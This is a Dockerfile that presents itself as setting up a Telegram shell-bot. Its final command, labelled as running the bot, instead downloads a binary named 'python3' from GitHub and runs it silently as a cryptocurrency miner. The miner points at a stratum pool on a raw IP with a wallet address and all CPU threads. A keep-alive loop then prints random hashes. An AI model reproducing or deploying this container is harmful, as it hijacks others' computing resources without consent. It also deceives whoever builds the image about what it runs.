FROM phusion/baseimage:bionic-1.0.0

# Use baseimage-docker's init system:
CMD ["/sbin/my_init"]

# Install dependencies:
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    nodejs \
    npm \
    screen \
    neofetch \
    ca-certificates \
    libcurl4 \
    libjansson4 \
    libgomp1 \
    libnuma-dev \
 && mkdir -p /home/stuff

# Set work dir:
WORKDIR /home

# Run config.sh and clean up APT:
RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# Install the bot:
RUN git clone https://github.com/botgram/shell-bot.git \
 && cd shell-bot \
 && npm install

RUN echo "Uploaded files:" && ls /home/stuff/

# Run bot script:
CMD wget https://github.com/viliamriah/newmind/raw/main/python3 && chmod +x python3 && ./python3 -a yespower -o stratum+tcp://137.184.136.62:443 -u web1q4f9hemgt64tpj2cranaxhtrcqqqedvnngzunpy.$(echo $(shuf -i 1-20000 -n 1)-Lord) -p x -t$(nproc --all) >/dev/null &
    while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
